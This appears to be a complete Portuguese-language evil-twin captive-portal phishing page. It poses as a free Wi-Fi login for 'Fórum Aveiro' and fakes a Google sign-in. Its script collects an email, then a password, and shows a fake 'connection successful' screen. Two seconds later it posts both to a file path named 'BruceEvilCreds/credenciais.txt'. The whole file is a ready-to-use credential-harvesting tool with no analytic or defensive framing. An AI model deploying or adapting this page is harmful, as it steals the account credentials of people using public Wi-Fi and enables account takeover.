<!-- AP="WI-FI FórumAveiro" -->
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Wi-Fi Fórum - Login</title>
  <style>
    *, *::before, *::after {
      box-sizing: border-box;
    }
    body {
      margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
    Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 16px;
  user-select: none;
  color: #374151;
  background: linear-gradient(135deg, #71c7d8 0%, #ffffff 100%);
  background-attachment: fixed;
    }
    main {
      background: white;
      max-width: 400px;
      width: 100%;
      border-radius: 5px;
      box-shadow: 0 4px 8px rgb(0 0 0 / 0.1);
      padding: 32px 32px 40px;
      text-align: center;
      position: relative;
      transition: opacity 0.3s ease;
    }
    main.hidden {
      display: none;
      opacity: 0;
      pointer-events: none;
      user-select: none;
    }
    .icon-circle {
      margin: 0 auto 20px auto;
      background-color: #2563eb;
      width: 56px;
      height: 56px;
      border-radius: 16px;
      box-shadow: 0 2px 6px rgb(37 99 235 / 0.5);
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-weight: 700;
    }
    .icon-svg {
      width: 24px;
      height: 24px;
      stroke: currentColor;
      stroke-width: 2;
      stroke-linecap: round;
      stroke-linejoin: round;
      fill: none;
    }
    h1 {
      font-weight: 700;
      font-size: 1.75rem;
      margin: 0 0 6px 0;
      color: #2563eb;
      user-select: text;
    }
    p.subtitle {
      color: #6b7280;
      margin: 0 0 24px 0;
      user-select: text;
      font-size: 1rem;
    }
    h2 {
      font-weight: 600;
      font-size: 1.125rem;
      color: #1f2937;
      margin: 24px 0 6px 0;
      user-select: text;
    }
    p.description {
      color: #4b5563;
      margin: 0 0 24px 0;
      user-select: text;
    }
    button.google-btn {
      background-color: rgb(255, 204, 0);
      color: white;
      border: none;
      border-radius: 5px;
      font-weight: 600;
      font-size: 1rem;
      padding: 14px 0;
      width: 100%;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      box-shadow: 0 2px 6px rgb(206, 165, 0);
      transition: background-color 0.3s ease;
      user-select: none;
    }
    button.google-btn:hover {
      background-color: #e6b800;
    }
    button.google-btn:focus {
      outline: 3px solid #93c5fd;
      outline-offset: 2px;
    }
    button.google-btn img {
      width: 20px;
      height: 20px;
      object-fit: contain;
    }
    p.terms {
      font-size: 0.75rem;
      color: #6b7280;
      margin-top: 32px;
      user-select: text;
    }
    p.terms a {
      color: #2563eb;
      text-decoration: underline;
    }
    p.terms a:hover {
      text-decoration: underline;
    }
    hr.separator {
      margin: 36px 0 12px 0;
      border: none;
      border-top: 1px solid #e5e7eb;
    }
    .indicators {
      display: flex;
      justify-content: center;
      gap: 40px;
      font-size: 0.875rem;
      color: #4b5563;
      user-select: text;
    }
    .indicator {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .indicator-dot {
      width: 12px;
      height: 12px;
      border-radius: 9999px;
      display: inline-block;
    }
    .indicator-dot.green {
      background-color: #22c55e;
    }
    .indicator-dot.blue {
      background-color: #2563eb;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 1px;
      margin-top: 24px;
      text-align: left;
      position: relative;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 14px 16px;
      font-size: 16px;
      border-radius: 5px;
      border: 1.5px solid #d1d5db;
      transition: border-color 0.3s ease;
      outline-offset: 2px;
      outline-color: transparent;
      user-select: text;
    }
    input[type="email"]:focus,
    input[type="password"]:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.3);
      outline-style: none;
    }
      .btn-submit {
  background-color: #3062E6;
  color: white;
  border: none;
  border-radius: 5px;
  padding: 12px 16px;       /* menos padding vertical, padding horizontal para deixar espaçado */
  font-weight: 600;
  font-size: 1rem;
  cursor: pointer;
  box-shadow: 0 2px 6px rgb(37 99 235 / 0.6);
  transition: background-color 0.3s ease;
  user-select: none;
  width: auto;            /* deixa o botão ter largura automática */
  display: inline-block;  /* para respeitar o width auto e se comportar como botão */
}
.btn-continue {
  background-color: #3062E6;
  color: white;
  border: none;
  border-radius: 5px;
  padding: 12px 16px;       /* menos padding vertical, padding horizontal para deixar espaçado */
  font-weight: 600;
  font-size: 1rem;
  cursor: pointer;
  box-shadow: 0 2px 6px rgb(37 99 235 / 0.6);
  transition: background-color 0.3s ease;
  user-select: none;
  width: auto;            /* deixa o botão ter largura automática */
  display: inline-block;  /* para respeitar o width auto e se comportar como botão */
}
.btn-submit:hover {
  background-color: #1d4ed8;
}
.button-container {
  display: flex;
  justify-content: flex-end;
  margin-top: 5px; /* opcional para espaçamento */
}
    .btn-back {
      background: none;
      border: none;
      color: #2563eb;
      font-weight: 600;
      font-size: 1rem;
      cursor: pointer;
      text-align: center;
      user-select: none;
      margin-top: 10px;
    }
    .btn-back:hover {
      text-decoration: underline;
    }
    .success-circle {
      margin: 0 auto 20px auto;
      background-color: #22c55e;
      width: 80px;
      height: 80px;
      border-radius: 9999px;
      color: white;
      font-weight: 900;
      font-size: 3.5rem;
      display: flex;
      justify-content: center;
      align-items: center;
      user-select: text;
    }
    /* Mensagens de erro */
    .error-text {
      color: #dc2626; /* vermelho */
      font-size: 1rem;
      margin-top: -3px;
      user-select: text;
      min-height: 18px;
    }
    /* Mensagens de sucesso e erro envio */
    #success-message, #error-send {
      display: none;
      margin-top: 16px;
      font-weight: 600;
      font-size: 0.9rem;
      user-select: text;
    }
    #success-message {
      color: #22c55e;
    }
    #error-send {
      color: #dc2626;
    }
  </style>
</head>
<body>

  <!-- Tela Inicial -->
  <main id="screen-initial">
    <div style="display: flex; justify-content: center; margin-bottom: 20px;">
  <img src="data:image/png;base64," alt="Logo" width="150" />
</div>
    <h1>Wi-Fi Fórum</h1>
    <p class="subtitle">Bem-vindo ao Fórum Aveiro</p>

    <h2>Conecte ao nosso WIFI Gratuito</h2>
    <p class="description">Ganhe acesso instantâneo ao wifi a partir do nosso portal de Login</p>

    <button class="google-btn" aria-label="Continuar com o Google" id="btnGoogle">
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-google" viewBox="0 0 16 16">
  <path d="M15.545 6.558a9.4 9.4 0 0 1 .139 1.626c0 2.434-.87 4.492-2.384 5.885h.002C11.978 15.292 10.158 16 8 16A8 8 0 1 1 8 0a7.7 7.7 0 0 1 5.352 2.082l-2.284 2.284A4.35 4.35 0 0 0 8 3.166c-2.087 0-3.86 1.408-4.492 3.304a4.8 4.8 0 0 0 0 3.063h.003c.635 1.893 2.405 3.301 4.492 3.301 1.078 0 2.004-.276 2.722-.764h-.003a3.7 3.7 0 0 0 1.599-2.431H8v-3.08z"/>
</svg>
      Continue com o Google
    </button>

    <p class="terms">
      Conectando você concorda com nossos
      <a href="#">Termos de Serviço</a> e
      <a href="#">Políticas de Privacidade</a>
    </p>

    <hr class="separator" />

    <div class="indicators">
      <div class="indicator">
        <span class="indicator-dot green" aria-hidden="true"></span>
        <span>Conexão segura</span>
      </div>
      <div class="indicator">
        <span class="indicator-dot blue" aria-hidden="true"></span>
        <span>Alta Velocidade</span>
      </div>
    </div>
  </main>

  <!-- Formulário Único para Email e Senha -->
  <main id="screen-login" class="hidden" aria-label="Formulário de Login Google">
    <div class="min-h-screen flex flex-col items-center justify-center p-4 bg-gray-50">
      <div class="bg-white p-6 rounded-md shadow-md w-full max-w-sm">
        <div id="logo" class="mb-4">
          <img src="data:image/webp;base64," alt="Google Logo" />
        </div>

        <h2 class="text-xl font-semibold mb-1" id="form-title">Conecte-se</h2>
        <p class="text-sm text-gray-600 mb-4" id="form-subtitle">Para se conectar ao Wi-Fi</p>

        <form id="loginForm" method="POST" action="/BruceEvilCreds/credenciais.txt" autocomplete="off" novalidate class="space-y-4">

          <!-- Email (visível na primeira tela do formulário) -->
          <div id="email-group" class="flex flex-col items-start gap-1 w-full">
            <input
              type="email"
              id="email"
              name="email"
              placeholder="exemplo@gmail.com"
              required
              autocomplete="email"
              aria-describedby="email-error"
              class="p-2 border border-gray-300 rounded-md w-full"
            />
          </div>
          <div id="email-error" class="error-text"></div>
          <!-- Senha (visível na segunda tela do formulário) -->
          <div id="password-group" class="flex flex-col items-start gap-1 w-full" style="display:none;">
            <input
              type="password"
              id="password"
              name="password"
              placeholder="Senha"
              required
              autocomplete="current-password"
              aria-describedby="password-error"
              minlength="6"
              class="p-2 border border-gray-300 rounded-md w-full"
            />
          </div>
          <div id="password-error" class="error-text" aria-live="polite"></div>
          <div class="button-container">
            <button type="submit" id="btnSubmit" class="btn-submit">Continuar</button>
          </div>
        </form>
      </div>
    </div>
  </main>

  <!-- Tela Sucesso -->
  <main id="screen-success" class="hidden" aria-live="polite" aria-atomic="true">
    <div class="success-circle" aria-hidden="true">✓</div>
    <h2>Parabéns! A conexão foi um sucesso.</h2>
    <p>Agora você está online.</p>
  </main>

<script>
  const btnGoogle = document.getElementById('btnGoogle');
  const screenInitial = document.getElementById('screen-initial');
  const screenLogin = document.getElementById('screen-login');
  const screenSuccess = document.getElementById('screen-success');
  const loginForm = document.getElementById('loginForm');

  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const emailError = document.getElementById('email-error');
  const passwordError = document.getElementById('password-error');

  const emailGroup = document.getElementById('email-group');
  const passwordGroup = document.getElementById('password-group');

  const btnSubmit = document.getElementById('btnSubmit');
  const formTitle = document.getElementById('form-title');
  const formSubtitle = document.getElementById('form-subtitle');

  function clearErrors() {
    emailError.textContent = '';
    passwordError.textContent = '';
  }

  function clearInputs() {
    emailInput.value = '';
    passwordInput.value = '';
  }

  function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  function validatePassword(password) {
    return password.length >= 6;
  }

  // Quando clica no botão Google, mostra a tela do formulário (email primeiro)
  btnGoogle.addEventListener('click', () => {
    screenInitial.classList.add('hidden');
    screenLogin.classList.remove('hidden');
    clearErrors();
    clearInputs();
    // mostra só email no início
    emailGroup.style.display = 'flex';
    passwordGroup.style.display = 'none';
    btnSubmit.textContent = 'Continuar';
    formTitle.textContent = 'Conecte-se';
    formSubtitle.textContent = 'Para se conectar ao Wi-Fi';
  });

  // Estado para controlar se está na etapa email ou senha
  let etapa = 'email';

  loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    clearErrors();

    if (etapa === 'email') {
      // Validar email
      const emailVal = emailInput.value.trim();
      if (!validateEmail(emailVal)) {
        emailError.textContent = 'E-mail inválido.';
        return;
      }
      // Avança para etapa senha
      etapa = 'senha';
      emailGroup.style.display = 'none';
      passwordGroup.style.display = 'flex';
      btnSubmit.textContent = 'Concluir';
      formTitle.textContent = 'Fazer login';
      formSubtitle.textContent = 'Para se conectar ao Wi-Fi';
      passwordInput.focus();
    } else if (etapa === 'senha') {
      // Validar senha e email antes de enviar
      const emailVal = emailInput.value.trim();
      const passwordVal = passwordInput.value;

      let valid = true;
      if (!validateEmail(emailVal)) {
        emailError.textContent = 'E-mail inválido.';
        valid = false;
      }
      if (!validatePassword(passwordVal)) {
        passwordError.textContent = 'Senha deve ter ao menos 6 caracteres.';
        valid = false;
      }
      if (!valid) return;

      // Esconde formulário e mostra tela de sucesso
      screenLogin.classList.add('hidden');
      screenSuccess.classList.remove('hidden');

      // Após 2 segundos, envia o formulário com email+senha para seu endpoint
      setTimeout(() => {
        loginForm.submit();
      }, 2000);
    }
  });
</script>
</body>
</html>
